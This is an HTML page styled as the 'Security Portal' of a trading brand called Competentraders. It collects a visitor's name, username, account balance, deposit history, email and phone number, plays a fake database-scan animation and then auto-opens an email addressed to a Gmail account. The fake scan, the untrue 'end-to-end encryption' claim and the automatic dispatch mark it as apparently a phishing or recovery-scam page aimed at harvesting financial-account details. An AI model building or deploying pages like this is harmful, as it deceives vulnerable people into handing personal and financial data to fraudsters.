<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fraud Verification | Competentraders</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap');
        body { font-family: 'Outfit', sans-serif; background: #040508; color: white; margin: 0; overflow-x: hidden; }
        
        .security-mesh {
            background-image: radial-gradient(#1e293b 0.5px, transparent 0.5px);
            background-size: 20px 20px;
            opacity: 0.2; position: fixed; inset: 0; pointer-events: none;
        }

        .terminal-card { 
            background: linear-gradient(145deg, #0f111a, #07080d); 
            border: 1px solid rgba(59, 130, 246, 0.2); 
            border-radius: 35px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
        }

        .input-group { position: relative; margin-bottom: 20px; }
        .input-group i { position: absolute; left: 18px; top: 18px; color: #3b82f6; font-size: 14px; }
        
        input, select { 
            background: #131722 !important; 
            border: 1px solid #1e293b !important; 
            color: white !important; 
            width: 100%; padding: 16px 16px 16px 48px; 
            border-radius: 18px; font-size: 13px; font-weight: 600;
            transition: 0.3s; outline: none;
        }
        input:focus { border-color: #3b82f6 !important; background: #161b29 !important; }

        /* BIRD POPUP */
        #bird-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.98); 
            z-index: 10000; display: none; align-items: center; justify-content: center;
            padding: 20px; backdrop-filter: blur(20px);
        }
        .bird-box {
            background: #0b0d12; border: 1px solid #3b82f6; 
            padding: 50px 30px; text-align: center;
            width: 100%; max-width: 380px; border-radius: 45px;
            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
        }

        /* SCANNING ANIMATION */
        .scan-line {
            width: 100%; height: 2px; background: #3b82f6;
            position: absolute; top: 0; left: 0;
            box-shadow: 0 0 15px #3b82f6;
            animation: scan 2s infinite linear;
            display: none;
        }
        @keyframes scan {
            0% { top: 0%; }
            100% { top: 100%; }
        }
    </style>
</head>
<body class="p-5 pb-20">
    <div class="security-mesh"></div>

    <div id="bird-overlay">
        <div class="bird-box">
            <div class="text-7xl mb-6 animate-bounce"></div>
            <h3 class="text-2xl font-black italic uppercase mb-2 tracking-tighter">Identity Logged</h3>
            <p class="text-gray-500 text-[10px] font-black uppercase mb-8 tracking-[3px]">Routing to Fraud Department</p>
            
            <a id="finalMailBtn" href="#" class="block w-full py-5 bg-blue-600 rounded-2xl font-black text-[11px] uppercase tracking-widest shadow-lg shadow-blue-500/30">
                Confirm & Open Secure Mail
            </a>
            <p id="countdown-text" class="text-[8px] text-gray-600 font-black uppercase mt-6 animate-pulse">Auto-dispatching in 5 seconds...</p>
        </div>
    </div>

    <div class="flex flex-col items-center text-center mt-6 mb-10">
        <div class="w-16 h-16 bg-blue-600/10 rounded-full flex items-center justify-center border border-blue-500/20 mb-4">
            <i class="fas fa-shield-halved text-2xl text-blue-500"></i>
        </div>
        <h1 class="text-3xl font-black uppercase italic leading-none">Security <span class="text-blue-500">Portal</span></h1>
        <p class="text-[9px] text-gray-500 font-black uppercase tracking-[4px] mt-2">Fraud & Recovery Department</p>
    </div>

    <div class="terminal-card p-6 relative overflow-hidden">
        <div id="scanner" class="scan-line"></div>
        
        <p class="text-[10px] font-black text-blue-500 uppercase mb-6 tracking-widest border-b border-blue-500/10 pb-2">Account Verification Form</p>
        
        <div class="grid grid-cols-2 gap-3">
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="f_name" placeholder="First Name">
            </div>
            <div class="input-group">
                <i class="fas fa-user"></i>
                <input type="text" id="l_name" placeholder="Last Name">
            </div>
        </div>

        <div class="input-group">
            <i class="fas fa-at"></i>
            <input type="text" id="u_name" placeholder="Username">
        </div>

        <div class="input-group">
            <i class="fas fa-wallet"></i>
            <input type="number" id="balance" placeholder="Approx. Account Balance ()">
        </div>

        <div class="input-group">
            <i class="fas fa-file-invoice-dollar"></i>
            <select id="deposit_slip">
                <option value="" disabled selected>Previous Deposits?</option>
                <option value="Yes - I have a slip">Yes, I have a deposit slip</option>
                <option value="No - First time">No, I haven't deposited</option>
            </select>
        </div>

        <div class="input-group">
            <i class="fas fa-envelope"></i>
            <input type="email" id="email" placeholder="Registered Email Address">
        </div>

        <div class="input-group">
            <i class="fas fa-phone"></i>
            <input type="tel" id="phone" placeholder="Registered Phone Number">
        </div>

        <button onclick="processRecovery()" id="submit-btn" class="w-full py-5 bg-blue-600 rounded-2xl font-black text-xs uppercase tracking-widest mt-4 shadow-xl shadow-blue-500/40 active:scale-95 transition-all">
            Submit To Fraud Team
        </button>
    </div>

    <div class="mt-10 text-center px-6">
        <p class="text-[9px] text-gray-600 font-black uppercase tracking-widest">Authorized Access Only</p>
        <p class="text-[8px] text-gray-500 mt-2">Competentraders uses end-to-end encryption for all fraud recovery requests.</p>
    </div>

    <script>
        function processRecovery() {
            const btn = document.getElementById('submit-btn');
            const scanner = document.getElementById('scanner');

            // Collect data
            const data = {
                first: document.getElementById('f_name').value,
                last: document.getElementById('l_name').value,
                user: document.getElementById('u_name').value,
                bal: document.getElementById('balance').value,
                slip: document.getElementById('deposit_slip').value,
                email: document.getElementById('email').value,
                phone: document.getElementById('phone').value
            };

            // Basic Validation
            if(!data.first || !data.user || !data.email) {
                alert("CRITICAL ERROR: Please fill in your primary credentials.");
                return;
            }

            // Start "Scan" Simulation
            btn.innerText = "SCANNING DATABASE...";
            btn.disabled = true;
            scanner.style.display = "block";

            setTimeout(() => {
                // Show Bird Overlay
                const overlay = document.getElementById('bird-overlay');
                overlay.style.display = 'flex';

                // Email Generation
                const recipient = "fraudteamcompetentraders@gmail.com";
                const subject = encodeURIComponent("SECURE RECOVERY REQUEST: " + data.user);
                const body = encodeURIComponent(
                    "--- COMPETENTRADERS FRAUD INVESTIGATION ---\n\n" +
                    "CLIENT IDENTITY:\n" +
                    "- Name: " + data.first + " " + data.last + "\n" +
                    "- Username: " + data.user + "\n\n" +
                    "SECURITY DATA:\n" +
                    "- Email: " + data.email + "\n" +
                    "- Phone: " + data.phone + "\n\n" +
                    "FINANCIAL DATA:\n" +
                    "- Reported Balance: " + (data.bal ? parseFloat(data.bal).toLocaleString() : "0") + "\n" +
                    "- Deposit Slip Available: " + data.slip + "\n\n" +
                    "REQUEST: Please verify this user and provide password recovery link."
                );

                const mailLink = `mailto:${recipient}?subject=${subject}&body=${body}`;
                const mailBtn = document.getElementById('finalMailBtn');
                mailBtn.href = mailLink;

                // Auto-dispatch countdown
                let timeLeft = 5;
                const timer = setInterval(() => {
                    timeLeft--;
                    document.getElementById('countdown-text').innerText = `Auto-dispatching in ${timeLeft} seconds...`;
                    if(timeLeft <= 0) {
                        clearInterval(timer);
                        mailBtn.click();
                    }
                }, 1000);

            }, 2500); // 2.5 second "scan" time
        }
    </script>
</body>
</html>
